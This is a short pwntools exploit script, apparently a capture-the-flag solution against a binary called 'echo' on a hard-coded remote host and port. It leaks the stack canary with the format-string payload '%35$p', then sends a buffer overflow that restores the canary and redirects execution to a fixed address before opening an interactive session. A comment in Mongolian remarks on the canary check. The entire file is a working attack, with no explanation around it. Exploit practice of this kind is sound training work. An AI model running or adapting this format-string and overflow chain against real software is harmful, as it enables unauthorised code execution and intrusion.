#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'echo')

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10323)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()
io.clean()
io.recvuntil(b'Enter some text:')
io.sendline(b'%35$p') # 00 byte aar tugssun bol canary checksec --file echo gej canary tai uguign harna
a = io.recvline()
canary = io.recvline()
log.success('[+] Found canary:', canary)
canary = int(canary.strip(), 16)
p = b'A' * 72 
p += p64(canary)
p += b'A' * 8
p += p64(0x000000000040101a)
p += p64(0x0000000000401244)
io.recvuntil(b'Do you have any reviews?')
io.sendline(p)
io.interactive()